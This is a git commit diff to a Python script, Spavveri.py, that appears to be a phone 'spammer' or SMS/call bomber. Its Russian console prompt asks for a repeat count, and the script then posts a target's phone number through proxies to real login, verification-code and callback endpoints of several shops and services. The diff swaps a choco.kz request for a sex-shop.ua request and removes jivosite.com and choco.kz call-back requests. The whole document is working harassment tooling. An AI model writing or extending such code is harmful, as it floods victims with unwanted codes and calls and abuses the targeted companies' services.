613ce15552e89de9671be8d3570398a671e72758
Hironotori <81866681+Hironotori@users.noreply.github.com>
2022-01-29 14:05:25 +0200

    Add files via upload

--- Spavveri.py
+++ Spavveri.py
@@ -51,10 +51,10 @@ else:
 run = int(console.input('[green]Введите количество повторов (1-25):\n[blue]spammer>> '))
 for _ in track(range(run)):
  try:
-         requests.post("https://api-proxy.choco.kz/user/v2/login/+{number}", headers=headers, proxies=proxies)
-         print('proxy.choco.kz')
+         requests.post("https://sex-shop.ua/bitrix/components/bxmaker/authuserphone.login/ajax.php", data={"parameters": "YToxOntzOjEwOiJDQUNIRV9UWVBFIjtzOjE6IkEiO30=.886837943a18715db75ae7fe96ae97183ca0be0637a0bc22ca3ba8d04e55b81f", "template": ".default.0439327cbb51aa71d187d378db240bf43d3133d2e235a6d74509561d345ec422", "siteId": "s1", "sessid": "48add65add0e6c591d7aae265c20b0db", "method": "sendCode", "phone": "+" + number, "regustration": "Y"}, headers=headers, proxies=proxies)
+         print('sex-shop.ua')
  except:
-         print('Не отправлено (proxy.choco.kz)')
+         print('Не отправлено (sex-shop.ua)')
  try:
          requests.post("https://my.ctrs.com.ua/api/auth/login", data={"provider": "phone", "identity": number}, headers=headers, proxies=proxies)#https://www.citrus.ua/?gclsrc=aw.ds&gclid=CjwKCAiAs92MBhAXEiwAXTi253UnT0-Ws93B3drlp81h97IFAOzTqmkLJLEStUktScA14Vu5Jn8AShoCS-UQAvD_BwE
          print('my.ctrs.com')
@@ -177,13 +177,3 @@ for _ in track(range(run)):
          print('sex-shop.ua')
  except:
          print('Не отправлено (sex-shop.ua)')
- try:
-         requests.post("https://telephony.jivosite.com/api/1/sites/900909/widgets/OVHsL3W8hY/clients/17314/telephony/callback", data={"phone": number, "invitation_text": ""}, headers=headers, proxies=proxies)
-         print('jivosite.com')
- except:
-         print('Не отправлено (jivosite.com)')
- try:
-         requests.post("https://api-proxy.choco.kz/user/v2/code", data={"login": number, "client_id": "-5", "dispatch_type": "call"}, headers=headers, proxies=proxies)
-         print('proxy.choco.kz')
- except:
-         print('Не отправлено (proxy.choco.kz)')
